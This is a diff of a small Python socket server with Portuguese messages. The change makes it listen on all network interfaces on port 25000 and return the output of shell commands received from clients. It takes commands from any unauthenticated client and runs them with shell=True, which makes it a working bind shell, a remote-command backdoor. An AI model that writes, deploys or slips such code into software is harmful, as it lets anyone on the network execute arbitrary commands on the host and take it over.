@@ -1,10 +1,10 @@
 import socket as s
-import subprocess
+import subprocess as subp
 
 
 def iniciar():
     socket = s.socket(s.AF_INET, s.SOCK_STREAM)
-    socket.bind(('localhost', 25000))
+    socket.bind(('', 25000))
     socket.listen(1)
 
     while True:
@@ -24,27 +24,25 @@ def atenderCliente(connection):
 
     while True:
         try:
-            comando = connection.recv(1024).decode('utf-8')
-
+            comando = connection.recv(2048).decode('utf-8')
             if comando.lower() == 'exit':
                 break
-    
-            resultado_cmd = subprocess.check_output(comando,
-                                                    universal_newlines=True,
-                                                    shell=True,
-                                                    stderr=subprocess.STDOUT)
-            if not resultado_cmd:
-                resultado_cmd = 'O comando não pôde ser executado.'
 
-            print("Resultado -> "+resultado_cmd)
-        except (FileNotFoundError, subprocess.CalledProcessError) as e:
-            print(e)
-            resultado_cmd = 'Comando não encontrado.'
-        except Exception as e:
-            print(e)
+            try:
+
+                resultado_cmd = subp.check_output(comando,
+                                                  universal_newlines=True,
+                                                  shell=True,
+                                                  stderr=subp.STDOUT)
+                if not resultado_cmd:
+                    resultado_cmd = 'O comando não pôde ser executado.'
+
+            except (FileNotFoundError, subp.CalledProcessError):
+                resultado_cmd = 'Comando não encontrado.'
+
+            connection.send(resultado_cmd.encode('utf-8'))
+        except:
             break
-
-        connection.send(resultado_cmd.encode('utf-8'))
 
     connection.close()
     print('Conexão encerrada')
